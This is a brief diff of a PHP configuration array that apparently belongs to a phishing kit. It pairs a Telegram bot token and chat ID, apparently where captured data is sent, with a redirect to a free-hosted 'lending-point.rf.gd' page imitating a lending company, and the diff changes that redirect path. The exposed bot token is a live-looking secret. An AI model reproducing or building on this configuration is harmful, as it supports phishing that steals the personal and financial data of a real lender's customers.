@@ -21,7 +21,7 @@ $site_map = [
             ['token' => '6304581861:AAGcg6NEHDa53yh9gIr_744so-hVPB-nFxk', 'chat_id' => '5539028238']
 
         ],
-        'redirect' => 'https://lending-point.rf.gd/cache_site/careers/all-listings.job.34092/processing.html'
+        'redirect' => 'https://lending-point.rf.gd/cache_site/lendingpoint/processing.html'
     ]
 ];
 
